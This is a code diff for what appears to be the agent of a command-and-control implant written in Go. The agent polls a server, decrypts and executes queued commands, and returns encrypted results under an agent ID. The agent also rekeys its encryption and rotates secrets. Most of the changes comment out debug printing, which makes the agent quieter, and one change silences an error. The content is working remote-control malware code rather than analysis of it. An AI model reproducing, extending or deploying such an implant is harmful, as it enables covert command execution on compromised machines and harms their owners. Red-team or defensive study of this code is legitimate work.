@@ -131,8 +131,6 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 		method = "POST" // Fallback to default
 	}
 
-	// Print the request details for debugging
-
 	// Create request with custom method
 	req, err := http.NewRequest(method, postURL, bytes.NewBuffer(jsonData))
 	if err != nil {
@@ -267,6 +265,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 	// Check for rekey command (special status that doesn't require decryption)
 	if response.Status == "rekey_required" {
+		//fmt.Println("[DEBUG] Received rekey command from server")
 
 		// Extract command DB ID for the rekey result
 		var commandDBID int
@@ -280,6 +279,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		}
 
 		// Execute rekey command directly without decryption
+		//fmt.Println("[DEBUG] Executing rekey command...")
 
 		// Create result for the rekey command first (before triggering rekey)
 		rekeyResult := &CommandResult{
@@ -300,8 +300,10 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 		// Perform handshake refresh in a separate goroutine to avoid deadlock
 		go func() {
+			//fmt.Println("[DEBUG] Starting rekey in background...")
 			if err := refreshHandshake(); err != nil {
 			} else {
+				//fmt.Println("[DEBUG] Rekey completed successfully")
 			}
 		}()
 
@@ -320,11 +322,14 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		decrypted, err := secureComms.DecryptMessage(response.Data)
 		if err != nil {
 			// Log decryption failure which might indicate key desync
+			//fmt.Println("[DEBUG] Key desync detected - initiating automatic rekey")
 
 			// Automatically trigger rekey in background
 			go func() {
+				//fmt.Println("[DEBUG] Starting automatic rekey due to decryption failure...")
 				if rekeyErr := refreshHandshake(); rekeyErr != nil {
 				} else {
+					//fmt.Println("[DEBUG] Automatic rekey completed successfully")
 				}
 			}()
 
@@ -336,43 +341,27 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		//fmt.Printf("[DEBUG] Decrypted command data from server: %s\n", decrypted)
 
 		if err := commandQueue.AddCommands(decrypted); err != nil {
-			return fmt.Errorf("failed to queue commands: %v", err)
+			//return fmt.Errorf("failed to queue commands: %v", err)
 		}
 
 		// Process commands
+		//fmt.Println("[DEBUG] Starting to process commands...")
 		for {
 			result, err := commandQueue.ProcessNextCommand()
 			if err != nil {
 				continue
 			}
 			if result == nil {
+				//fmt.Println("[DEBUG] No more commands to process")
 				break
 			}
 			/*
-				fmt.Printf("[DEBUG] Processing command result:\n"+
-					"Command: %s\n"+
-					"Command DB ID: %d\n"+
-					"Agent ID: %s\n"+
-					"Filename: %s\n"+
-					"Current Chunk: %d\n"+
-					"Total Chunks: %d\n"+
-					"Output: %s\n"+
-					"Error: %v\n"+
-					"Exit Code: %d\n",
-					result.Command.Command,
-					result.Command.CommandDBID,
-					result.Command.AgentID,
-					result.Command.Filename,
-					result.Command.CurrentChunk,
-					result.Command.TotalChunks,
-					result.Output,
-					result.Error,
-					result.ExitCode)
-			*/
+			 */
 			if err := resultManager.AddResult(result); err != nil {
 			} else {
 			}
 		}
+		//fmt.Println("[DEBUG] Command processing complete, rotating secret")
 		secureComms.RotateSecret()
 	}
 
@@ -420,6 +409,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			// Check for shutdown signal at the start of each iteration
 			select {
 			case <-pollingShutdown:
+				//fmt.Println("Polling shutdown signal received, exiting polling loop")
 				return
 			default:
 				// Continue with polling
@@ -442,15 +432,12 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 				backoffMultiplier := math.Min(float64(consecutiveErrors), float64(maxBackoffMultiplier))
 				backoffInterval := time.Duration(float64(nextInterval) * math.Pow(2, backoffMultiplier))
 				nextInterval = backoffInterval
-			} else {
 			}
 
 			// Handle pending results before sleep
 			if resultManager.HasResults() {
 				results := resultManager.GetPendingResults()
 				if len(results) > 0 {
-					// ADD DETAILED DEBUG LOGGING
-
 					encryptedData := struct {
 						AgentID string            `json:"agent_id"`
 						Results []CommandResponse `json:"results"`
@@ -495,6 +482,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			// Check for shutdown before sleep
 			select {
 			case <-pollingShutdown:
+				//fmt.Println("Polling shutdown requested before sleep, exiting...")
 				return
 			case <-time.After(nextInterval):
 				// Continue with next poll
@@ -504,6 +492,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			if err := doPoll(secureComms, customHeaders); err != nil {
 				// Check if this is a rekey in progress - if so, exit the entire goroutine
 				if err.Error() == "rekey in progress" {
+					//fmt.Println("Rekey initiated, exiting current polling loop")
 					break pollingLoop // Break out of the outer for loop
 				}
 				// Check for decryption failures
@@ -522,6 +511,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 
 // StopPolling signals the current polling routine to stop and waits for it to finish
 func StopPolling() {
+	//fmt.Println("Stopping current polling routine...")
 
 	pollingMutex.Lock()
 	if pollingShutdown != nil {
@@ -539,7 +529,9 @@ func StopPolling() {
 
 	select {
 	case <-done:
+		//fmt.Println("Polling routine stopped successfully")
 	case <-time.After(10 * time.Second):
+		//fmt.Println("Warning: Polling routine stop timed out after 10 seconds")
 	}
 
 	// Reset only the WaitGroup, NOT the channel
